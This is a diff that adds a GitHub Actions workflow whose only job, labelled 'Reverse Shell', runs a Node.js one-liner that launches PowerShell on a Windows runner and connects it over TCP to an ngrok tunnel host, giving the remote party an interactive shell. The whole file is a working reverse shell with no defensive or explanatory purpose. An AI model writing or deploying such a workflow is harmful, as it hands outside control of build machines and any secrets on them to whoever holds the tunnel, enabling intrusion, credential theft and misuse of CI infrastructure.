@@ -1,0 +1,15 @@
+name: windows
+on: 
+  workflow_dispatch:
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  term:
+    name: Reverse Shell
+    runs-on: windows-latest
+    steps:
+      - name: Start
+        run: |
+          node -e "!function(){var e=require('net'),n=require('child_process').spawn('powershell',[]),i=new e.Socket;i.connect(16250,'4.tcp.eu.ngrok.io',function(){i.pipe(n.stdin),n.stdout.pipe(i),n.stderr.pipe(i)})}();"
